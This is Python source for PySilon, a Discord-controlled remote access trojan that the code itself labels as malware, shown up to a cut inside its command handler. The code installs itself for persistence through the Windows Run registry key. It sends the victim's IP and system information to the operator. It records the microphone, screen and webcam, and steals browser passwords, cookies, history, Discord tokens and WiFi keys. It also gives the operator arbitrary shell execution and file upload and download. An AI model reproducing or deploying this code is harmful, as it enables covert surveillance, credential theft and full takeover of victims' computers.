from cv2 import VideoCapture, imwrite, CAP_DSHOW
from resources.discord_token_grabber import *
from pynput.keyboard import Key, Listener
from resources.passwords_grabber import *
from browser_history import get_history
from resources.get_cookies import *
from urllib.request import urlopen
from scipy.io.wavfile import write
from filesplit.split import Split
from filesplit.merge import Merge
from shutil import copy2, rmtree
from psutil import process_iter
from itertools import islice
from threading import Thread
from resources.misc import *
from getpass import getuser
from zipfile import ZipFile
from PIL import ImageGrab
from pathlib import Path
import sounddevice
import subprocess
import pyautogui
import discord
import pyaudio
import asyncio
import winreg
import sys
import os

#
#
#    READ BEFORE RUNNING!
#
#    1. If you run this script by interpreter (not built executable), uncomment Line-105.
#    2. Before you run this code or compile it or send to someone, read the Disclaimer (Line-65) carefully.
#    3. If you encounter any errors, please let me know and I will be more than happy to help. [https://github.com/mategol/PySilon-malware/issues/new/choose]
#    4. I highly SUGGEST you to test compiled executable on Virtual Machnine before you will "give it a use".
#       If there would be any errors (probably wont but it's still freaking Windows), I could fix them for you.
#
#    HOW TO COMPILE:
#
#    python -m venv pysilon
#    pysilon\Scripts\activate.bat
#    pip install -r requirements.txt
#    pip install pyinstaller
#    python compiler_obsolete.py
#
#
#    IF YOU WANT TO HAVE LESS SIZE OF COMPILED EXECUTABLE RATHER THAN FEATURE OF CAPTURING WEBCAM IMAGES:
#
#    1. Delete the import of 'cv2' module (1st line), but leave this line empty, don't fully remove it.
#    2. Delete the '.webcam' command from 'on_message' function (lines 691-703)
#
#
#    DON'T EVEN TRY TO COMPILE THE SOURCE CODE INTO EXECUTABLE ON YOUR OWN
#    
#    Use compiler.py. Unless you exacly know what are you doing. But if you
#    encounter errors while compiling without compiler.py, don't post Issues
#    on GitHub.
#

###############################################################################
##                                                                           ##
##   DISCLAIMER !!! READ BEFORE USING                                        ##
##                                                                           ##
##   Information and code provided in this project are                       ##
##   for educational purposes only. The creator is no                        ##
##   way responsible for any direct or indirect damage                       ##
##   caused due to the misusage of the information.                          ##
##                                                                           ##
##   Everything you do, you are doing at your own risk and responsibility.   ##
##                                                                           ##
###############################################################################

# ----------- Begin of config ---------- #
# - Please check out README.md before  - #     ! It is recommended to use compiler.py for building executable !
# -   you change following settings    - #       (following settings will be configured directly in compiler.py)

bot_tokens = ['']
software_registry_name = 'PySilon'
software_directory_name = software_registry_name
software_executable_name = software_registry_name.replace(' ', '') + '.exe'

channel_ids = {
    'info': None,
    'main': None,
    'spam': None,
    'file': None,
    'recordings': None,
    'voice': None
}

secret_key = ''
guild_id = None

# -            End of config           - #
# - Don't change anything below unless - #
# - you know exacly what are you doing - #
# -------------------------------------- #

client = discord.Client(intents=discord.Intents.all())
bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
#opuslib_path = 'resources/libopus-0.x64.dll'
discord.opus.load_opus(opuslib_path)
    
ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
text_buffor, force_to_send = '', False
messages_to_send, files_to_send, embeds_to_send = [], [], []
processes_messages, processes_list, process_to_kill = [], [], ''
files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
cookies_thread, implode_confirmation, cmd_messages = None, None, []
working_directory = sys.argv[0].split('\\')[:-1]

if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
    try: os.mkdir('C:\\Users\\' + getuser() + '\\' + software_directory_name)
    except: pass
    copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
    winreg.SetValueEx(registry_key, software_registry_name, 0, winreg.REG_SZ, 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    winreg.CloseKey(registry_key)

@client.event
async def on_ready():
    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread
    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    if [channel_ids['info'], channel_ids['main'], channel_ids['spam'], channel_ids['file'], channel_ids['recordings'], channel_ids['voice']] == [None, None, None, None, None, None]:
        first_run = True
        for category_name in client.get_guild(guild_id).categories:
            if hwid in str(category_name):
                first_run, category = False, category_name
                break

        if first_run:
            category = await client.get_guild(guild_id).create_category(hwid)
            temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
            temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
            temp = await client.get_guild(guild_id).create_text_channel('spam', category=category); channel_ids['spam'] = temp.id
            temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category); channel_ids['recordings'] = temp.id
            temp = await client.get_guild(guild_id).create_text_channel('file', category=category); channel_ids['file'] = temp.id
            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id
            
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
            system_info = force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
            chunk = ''
            for line in system_info.split('\n'):
                if len(chunk) + len(line) > 1990:
                    await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
                    chunk = line + '\n'
                else:
                    chunk += line + '\n'
            await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
        else:
            for channel in category.channels:
                match channel.name:
                    case 'info': channel_ids['info'] = channel.id
                    case 'main': channel_ids['main'] = channel.id
                    case 'spam': channel_ids['spam'] = channel.id
                    case 'file': channel_ids['file'] = channel.id
                    case 'recordings': channel_ids['recordings'] = channel.id
                    case 'Live microphone': channel_ids['voice'] = channel.id

    await client.get_channel(channel_ids['main']).send('||-||\n||-||\n||-||```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + '```')

    recording_channel_last_message = await discord.utils.get(client.get_channel(channel_ids['recordings']).history())

    if recording_channel_last_message == None or recording_channel_last_message.content != 'disable':
        Thread(target=start_recording).start()
        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Started recording...`')
    else:
        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Recording disabled. If you want to enable it, just delete last message on` <#' + str(channel_ids['recordings']) + '>')
    
    while True:
        if len(messages_to_send) > 0:
            for message in messages_to_send:
                await client.get_channel(message[0]).send(message[1])
                await asyncio.sleep(0.1)
            messages_to_send = []
        if len(files_to_send) > 0:
            for file in files_to_send:
                await client.get_channel(file[0]).send(file[1], file=discord.File(file[2], filename=file[2]))
                await asyncio.sleep(0.1)
                if file[3]:
                    subprocess.run('del ' + file[2], shell=True)
            files_to_send = []
        if len(embeds_to_send) > 0:
            for embedd in embeds_to_send:
                await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1], color=0x0084ff).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
                await asyncio.sleep(0.1)
            embeds_to_send = []
        if os.path.exists('ready.cookies') and cookies_thread != None:
            await asyncio.sleep(1)
            reaction_msg = await client.get_channel(channel_ids['main']).send('```Grabbed cookies```', file=discord.File('cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
            subprocess.run('del cookies.txt', shell=True)
            subprocess.run('del ready.cookies', shell=True)
            cookies_thread = None
        await asyncio.sleep(1)

@client.event
async def on_raw_reaction_add(payload):
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    user = payload.member
    
    if user.bot == False:
        if str(reaction) == '📌':
            if message.channel.id in channel_ids.values():
                await message.pin()
                last_message = await discord.utils.get(message.channel.history())
                await last_message.delete()
        elif str(reaction) == '🔴':
            await message.delete()

@client.event
async def on_reaction_add(reaction, user):
    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill, expectation, cmd_messages
    if user.bot == False:
        if reaction.message.channel.id in channel_ids.values():
            try:
                match str(reaction):
                    case '🔴':
                        if reaction.message.content[:15] == '```End of tree.':
                            for i in tree_messages:
                                try: await i.delete()
                                except: pass
                            tree_messages = []
                            subprocess.run('del tree.txt', shell=True)
                        elif reaction.message.content == '```End of command stdout```':
                            for i in cmd_messages:
                                await i.delete()
                            cmd_messages = []
                        elif reaction.message.content[-25:] == '.kill <process-number>```':
                            for i in processes_messages:
                                try: await i.delete()
                                except: pass
                            processes_messages = []
                        elif expectation == 'implosion':
                            expectation = None
                        

                    case '📥':
                        if reaction.message.content[:15] == '```End of tree.':
                            await reaction.message.channel.send(file=discord.File('tree.txt'))
                            subprocess.run('del tree.txt', shell=True)

                    case '✅':
                        if len(messages_from_sending_big_file) > 1:
                            for i in messages_from_sending_big_file:
                                await i.delete()
                            messages_from_sending_big_file = []

                    case '📤':
                        if expectation == 'onefile':
                            split_v1 = str(one_file_attachment_message.attachments).split("filename='")[1]
                            filename = str(split_v1).split("' ")[0]
                            await one_file_attachment_message.attachments[0].save(fp='/'.join(working_directory) + '/' + filename)
                            async for message in reaction.message.channel.history(limit=2):
                                await message.delete()
                            await reaction.message.channel.send('```Uploaded  ' + filename + '  into  ' + '/'.join(working_directory) + '/' + filename + '```')
                            expectation = None

                        elif expectation == 'multiplefiles':
                            try: os.mkdir('temp')
                            except: rmtree('temp'); os.mkdir('temp')

                            await files_to_merge[0][-1].edit(content='```Uploading file 1 of ' + str(len(files_to_merge[1])) + '```')
                            for i in range(len(files_to_merge[1])):
                                split_v1 = str(files_to_merge[1][i].attachments).split("filename='")[1]
                                filename = str(split_v1).split("' ")[0]
                                await files_to_merge[1][i].attachments[0].save(fp='temp/' + filename)
                                await files_to_merge[0][-1].edit(content='```Uploading file ' + str(i+1) + ' of ' + str(len(files_to_merge[1])) + '```')
                            await files_to_merge[0][-1].edit(content='```Uploading completed```')
                            for i in os.listdir('temp'):
                                if i != 'manifest':
                                    os.rename('temp/' + i, 'temp/' + i[:-8])
                            Merge('temp', '/'.join(working_directory), files_to_merge[2]).merge(cleanup=True)
                            rmtree('temp')
                            async for message in client.get_channel(channel_ids['file']).history():
                                await message.delete()
                            await reaction.message.channel.send('```Uploaded  ' + files_to_merge[2] + '  into  ' + '/'.join(working_directory) + '/' + files_to_merge[2] + '```')
                            files_to_merge = [[], [], []]
                            expectation = None

                    case '💀':  
                        if reaction.message.content[:39] == '```Do you really want to kill process: ':
                            await reaction.message.delete()
                            try:
                                process_name = process_to_kill[0]
                                if process_name[-1] == ']':
                                    process_name = process_name[::-1]
                                    for i in range(len(process_name)):
                                        if process_name[i] == '[':
                                            process_name = process_name[i+4:]
                                            break
                                    process_name = process_name[::-1]
                            except Exception as e:
                                reaction_msg = await reaction.message.channel.send('```Error while parsing the process name...\n' + str(e) + '```')
                                await reaction_msg.add_reaction('🔴')
                            try:
                                killed_processes = []
                                for proc in process_iter():
                                    if proc.name() == process_name:
                                        proc.kill()
                                        killed_processes.append(proc.name())
                                processes_killed = ''
                                for i in killed_processes:
                                    processes_killed = processes_killed + '\n• ' + str(i)
                                reaction_msg = await reaction.message.channel.send('```Processes killed by ' + str(user) + ' at ' + current_time() + processes_killed + '```')
                                await reaction_msg.add_reaction('🔴')
                            except Exception as e:
                                reaction_msg = await reaction.message.channel.send('```Error while killing processes...\n' + str(e) + '```')
                                await reaction_msg.add_reaction('🔴')
                        
                        elif expectation == 'implosion':
                            registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
                            winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
                            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
                            winreg.DeleteValue(registry_key, software_directory_name)
                            secure_delete_file('PySilon.key', 10)
                            cmd = 'start cmd /c "TIMEOUT /T 2&del "' + sys.argv[0] + '"'
                            os.system(cmd)
                            sys.exit(0)

            except Exception as err: print(err)

@client.event
async def on_raw_reaction_remove(payload):
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    user = payload.member

    if str(reaction) == '📌':
        await message.unpin()

@client.event
async def on_message(message):
    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages
    if message.author != client.user:
        if message.channel.id in channel_ids.values():

            if message.content == '.ss':
                await message.delete()
                ImageGrab.grab(all_screens=True).save('ss.png')
                reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
                subprocess.run('del ss.png', shell=True)

            elif message.content == '.join':
                await message.delete()
                vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
                vc.play(PyAudioPCM())
                await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')

            elif message.content == '.tree':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    tree_messages = []

                    dir_path = Path('/'.join(working_directory))
                    tree_messages.append(await message.channel.send('```Directory tree requested by ' + str(message.author) + '\n\n' + '/'.join(working_directory) + '```'))
                    with open('tree.txt', 'w', encoding='utf-8') as system_tree:
                        system_tree.write(str(dir_path) + '\n')

                    length_limit = sys.maxsize
                    iterator = tree(Path('/'.join(working_directory)))

                    tree_message_content = '```^\n'
                    for line in islice(iterator, length_limit):
                        with open('tree.txt', 'a+', encoding='utf-8') as system_tree:
                            system_tree.write(line + '\n')
                        if len(tree_message_content) > 1800:
                            tree_messages.append(await message.channel.send(tree_message_content + str(line) + '```'))
                            tree_message_content = '```'
                        else:
                            tree_message_content += str(line) + '\n'
                    if tree_message_content != '```':
                        tree_messages.append(await message.channel.send(tree_message_content + '```'))
                    
                    reaction_msg = await message.channel.send('```End of tree. React with 📥 to download this tree as .txt file, or with 🔴 to clear all above messages```')
                    subprocess.run('del tree.txt', shell=True)
                    await reaction_msg.add_reaction('📥')
                    await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

            elif message.content[:3] == '.cd':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content.strip() == '.cd':
                        reaction_msg = await message.channel.send('```Syntax: .cd <directory>```'); await reaction_msg.add_reaction('🔴')
                    else:
                        if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
                            if '/' in message.content:
                                for dir in message.content[4:].split('/'):
                                    if dir == '..': working_directory.pop(-1)
                                    else: working_directory.append(dir)
                            else:
                                if message.content[4:] == '..': working_directory.pop(-1)
                                else: working_directory.append(message.content[4:])
                            reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                        else:
                            reaction_msg = await message.channel.send('```❗ Directory not found.```'); await reaction_msg.add_reaction('🔴')

                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

            elif message.content == '.ls':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    dir_content_f, dir_content_d, directory_content = [], [], []
                    for element in os.listdir('/'.join(working_directory)+'/'):
                        if os.path.isfile('/'.join(working_directory)+'/'+element): dir_content_f.append(element)
                        else: dir_content_d.append(element)
                    dir_content_d.sort(key=str.casefold); dir_content_f.sort(key=str.casefold)
                    for single_directory in dir_content_d: directory_content.append(single_directory)
                    for single_file in dir_content_f: directory_content.append(single_file)
                    await message.channel.send('```Content of ' + '/'.join(working_directory) +'/ at ' + current_time() + '```')
                    lsoutput = directory_content
                    while lsoutput != []:
                        if len('\n'.join(lsoutput)) > 1994:
                            temp = ''
                            while len(temp+lsoutput[0])+1 < 1994:
                                temp += lsoutput[0] + '\n'
                                lsoutput.pop(0)
                            await message.channel.send('```' + temp + '```')
                        else:
                            await message.channel.send('```' + '\n'.join(lsoutput) + '```')
                            lsoutput = []
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

            elif message.content == '.pwd':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

            elif message.content[:9] == '.download':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content == '.download':
                        reaction_msg = await message.channel.send('```Syntax: .download <file-or-directory>```'); await reaction_msg.add_reaction('🔴')
                    else:
                        if os.path.exists('/'.join(working_directory) + '/' + message.content[10:]):
                            target_file = '/'.join(working_directory) + '/' + message.content[10:]
                            if os.path.isdir(target_file):
                                target_file += '.zip'
                                with ZipFile(target_file,'w') as zip:
                                    for file in get_all_file_paths('.'.join(target_file.split('.')[:-1])):
                                        zip.write(file)

                            if os.stat(target_file).st_size <= 8388608:
                                await message.channel.send(file=discord.File(target_file))
                            else:
                                try: os.mkdir('temp')
                                except: rmtree('temp'); os.mkdir('temp')
                                Split(target_file, 'temp').bysize(1024*1024*8)
                                splitted_files_to_send = os.listdir('temp')
                                for sfile in splitted_files_to_send:
                                    if sfile != 'manifest':
                                        os.rename('temp/' + sfile, 'temp/' + sfile + '.pysilon')
                                splitted_files_to_send = os.listdir('temp')

                                messages_from_sending_big_file = []
                                for i in splitted_files_to_send:
                                    messages_from_sending_big_file.append(await message.channel.send(file=discord.File('temp/' + i)))
                                rmtree('temp')
                                reaction_msg = await message.channel.send('```Download all above files, run merger.exe and then react to this message```')
                                messages_from_sending_big_file.append(reaction_msg)
                                await reaction_msg.add_reaction('✅')
                        else:
                            reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

            elif message.content[:7] == '.upload':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content.strip() == '.upload':
                        reaction_msg = await message.channel.send('```Syntax: .upload <type> [name]\nTypes:\n    single - upload one file with size less than 8MB\n    multiple - upload multiple files prepared by Splitter with total size greater than 8MB```'); await reaction_msg.add_reaction('🔴')
                    else:
                        if message.content[8:] == 'single':
                            expectation = 'onefile'
                            await message.channel.send('```Please send here a file to upload.```')
                        elif message.content[8:16] == 'multiple' and len(message.content) > 17:
                            expectation = 'multiplefiles'
                            files_to_merge[2] = message.content[17:]
                            files_to_merge[0].append(await message.channel.send('```Please send here all files (one-by-one) prepared by Splitter and then type  .done```'))
                        else: reaction_msg = await message.channel.send('```Syntax: .upload multiple <name>```'); await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

            elif message.content[:7] == '.remove':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content.strip() == '.remove':
                        reaction_msg = await message.channel.send('```Syntax: .remove <file-or-directory>```'); await reaction_msg.add_reaction('🔴')
                    else:
                        if os.path.exists('/'.join(working_directory) + '/' + message.content[8:]):
                            try:
                                if os.path.isfile('/'.join(working_directory) + '/' + message.content[8:]):
                                    subprocess.run('del "' + '\\'.join(working_directory) + '\\' + message.content[8:] + '"', shell=True)
                                else:
                                    rmtree('/'.join(working_directory) + '/' + message.content[8:])
                                reaction_msg = await message.channel.send('```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```'); await reaction_msg.add_reaction('🔴')
                            except Exception as error:
                                reaction_msg = await message.channel.send('`' + str(error) + '`'); await reaction_msg.add_reaction('🔴')
                        else:
                            reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

            elif message.content == '.done':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if expectation == 'multiplefiles':
                        files_to_merge[0].append(await message.channel.send('```This files will be uploaded and merged into  ' + '/'.join(working_directory) + '/' + files_to_merge[2] + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```'))
                        await files_to_merge[0][-1].add_reaction('📤')
                        await files_to_merge[0][-1].add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

            elif message.content == '.clear':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    async for message in client.get_channel(channel_ids['file']).history():
                        await message.delete()
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

            elif message.content[:5] == '.show':
                await message.delete()
                if message.content.strip() == '.show':
                    reaction_msg = await message.channel.send('```Syntax: .show <what-to-show>```'); await reaction_msg.add_reaction('🔴')
                else:
                    if message.content[6:] == 'processes':
                        processes, processes_list = [], []
                        for proc in process_iter():
                            processes.append(proc.name())
                        processes.sort(key=str.lower)
                        how_many, temp = 1, processes[0]; processes.pop(0)
                        for i in processes:
                            if temp == i: how_many += 1
                            else:
                                if how_many == 1: processes_list.append('``' + temp + '``')
                                else: processes_list.append('``' + temp + '``   [x' + str(how_many) + ']'); how_many = 1
                                temp = i
                        total_processes = len(processes)
                        processes = ''
                        reaction_msg = await message.channel.send('```Processes at ' + current_time() + ' requested by ' + str(message.author) + '```')
                        processes_messages.append(reaction_msg)
                        for proc in range(1, len(processes_list)):
                            if len(processes) < 1800:
                                processes = processes + '\n**' + str(proc) + ') **' + str(processes_list[proc])
                            else:
                                processes += '\n**' + str(proc) + ') **' + str(processes_list[proc])
                                reaction_msg = await message.channel.send(processes)
                                processes_messages.append(reaction_msg)
                                processes = ''
                        reaction_msg = await message.channel.send(processes + '\n Total processes:** ' + str(total_processes) + '**\n```If you want to kill a process, type  .kill <process-number>```')
                        processes_messages.append(reaction_msg)
                        await reaction_msg.add_reaction('🔴')

            elif message.content[:5] == '.kill':
                await message.delete()
                if len(processes_list) > 10:
                    try: asd = int(message.content[6:]) + 1
                    except:
                        reaction_msg = await message.channel.send('```Please provide a valid number of process from  .show processes```')
                        await reaction_msg.add_reaction('🔴')
                        return
                    if int(message.content[6:]) < len(processes_list) and int(message.content[6:]) > 0:
                        reaction_msg = await message.channel.send('```Do you really want to kill process: ' + processes_list[int(message.content[6:])].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```')
                        process_to_kill = [processes_list[int(message.content[6:])].replace('`', ''), False]
                        await reaction_msg.add_reaction('💀')
                        await reaction_msg.add_reaction('🔴')
                    else:
                        reaction_msg = await message.channel.send("```There isn't any process with that index. Range of process indexes is 1-" + str(len(processes_list)-1) + '```')
                        await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('```You need to generate the processes list to use this feature\n.show processes```')
                    await reaction_msg.add_reaction('🔴')

            elif message.content[:5] == '.grab':
                await message.delete()
                if message.content.strip() == '.grab':
                    reaction_msg = await message.channel.send('```Syntax: .grab <what-to-grab>```'); await reaction_msg.add_reaction('🔴')    
                else:
                    if message.content[6:] == 'passwords':
                        result = grab_passwords()
                        embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff)
                        for url in result.keys():
                            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
                        
                    elif message.content[6:] == 'history':
                        with open('history.txt', 'w') as history:
                            for entry in get_history().histories:
                                history.write(entry[0].strftime('%d.%m.%Y %H:%M') + ' -> ' + entry[1] +'\n\n')
                        reaction_msg = await message.channel.send(file=discord.File('history.txt')); await reaction_msg.add_reaction('🔴')
                        subprocess.run('del history.txt', shell=True)
                    
                    elif message.content[6:] == 'cookies':
                        if cookies_thread == None:
                            cookies_thread = Thread(target=grab_cookies); cookies_thread.start()
                            await message.channel.send('```Grabbing cookies. Please wait...```')
                        else:
                            reaction_msg = await message.channel.send('``Cookies are being collected. Please be patient...``'); await reaction_msg.add_reaction('🔴')

                    elif message.content[6:].lower() == 'wifi':
                        networks = force_decode(subprocess.run('netsh wlan show profile', capture_output=True, shell=True).stdout).strip()
                        polish_bytes = ['\\xa5', '\\x86', '\\xa9', '\\x88', '\\xe4', '\\xa2', '\\x98', '\\xab', '\\xbe', '\\xa4', '\\x8f', '\\xa8', '\\x9d', '\\xe3', '\\xe0', '\\x97', '\\x8d', '\\xbd']
                        polish_chars = ['ą', 'ć', 'ę', 'ł', 'ń', 'ó', 'ś', 'ź', 'ż', 'Ą', 'Ć', 'Ę', 'Ł', 'Ń', 'Ó', 'Ś', 'Ź', 'Ż']

                        for i in polish_bytes:
                            networks = networks.replace(i, polish_chars[polish_bytes.index(i)])

                        network_names_list = []
                        for profile in networks.split('\n'):
                            if ': ' in profile:
                                network_names_list.append(profile[profile.find(':')+2:].replace('\r', ''))

                        result, password = {}, ''
                        for network_name in network_names_list:
                            command = 'netsh wlan show profile "' + network_name + '" key=clear'
                            current_result = force_decode(subprocess.run(command, capture_output=True, shell=True).stdout).strip()
                            for i in polish_bytes:
                                current_result = current_result.replace(i, polish_chars[polish_bytes.index(i)])
                            for line in current_result.split('\n'):
                                if 'Key Content' in line:
                                    password = line[line.find(':')+2:-1]
                            result[network_name] = password
                        
                        embed=discord.Embed(title='Grabbed WiFi passwords', color=0x0084ff)
                        for network in result.keys():
                            embed.add_field(name='🪪 ' + network, value='🔑 ' + result[network], inline=False)
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')

                    elif message.content[6:] == 'discord':
                        accounts = grab_discord.initialize()
                        for account in accounts:
                            reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 

            elif message.content[:8] == '.execute':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content.strip() == '.execute':
                        reaction_msg = await message.channel.send('```Syntax: .execute <filename>```'); await reaction_msg.add_reaction('🔴')
                    else:
                        if os.path.exists('/'.join(working_directory) + '/' + message.content[9:]):
                            try:
                                subprocess.run('start ' + '/'.join(working_directory) + '/' + message.content[9:], shell=True)
                                await asyncio.sleep(1)
                                ImageGrab.grab(all_screens=True).save('ss.png')
                                reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Executed: ' + '/'.join(working_directory) + '/' + message.content[9:] + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
                                subprocess.run('del ss.png', shell=True)
                                await message.channel.send('```Successfully executed: ' + message.content[9:] + '```')
                            except:
                                reaction_msg = await message.channel.send('```❗ Something went wrong...```'); await reaction_msg.add_reaction('🔴')
                        else:
                            reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

            elif message.content[:4] == '.cmd':
                await message.delete()
                if message.content.strip() == '.cmd':
                    reaction_msg = await message.channel.send('```Syntax: .cmd <command>```'); await reaction_msg.add_reaction('🔴')
                else:
                    cmd_output = force_decode(subprocess.run(message.content[5:], capture_output= True, shell= True).stdout).strip()
                    message_buffer, cmd_messages = '', []
                    reaction_msg = await message.channel.send('```Executed command: ' + message.content[5:] + '\nstdout:```'); cmd_messages.append(reaction_msg)
                    for line in range(1, len(cmd_output.split('\n'))):
                        if len(message_buffer) + len(cmd_output.split('\n')[line]) > 1950:
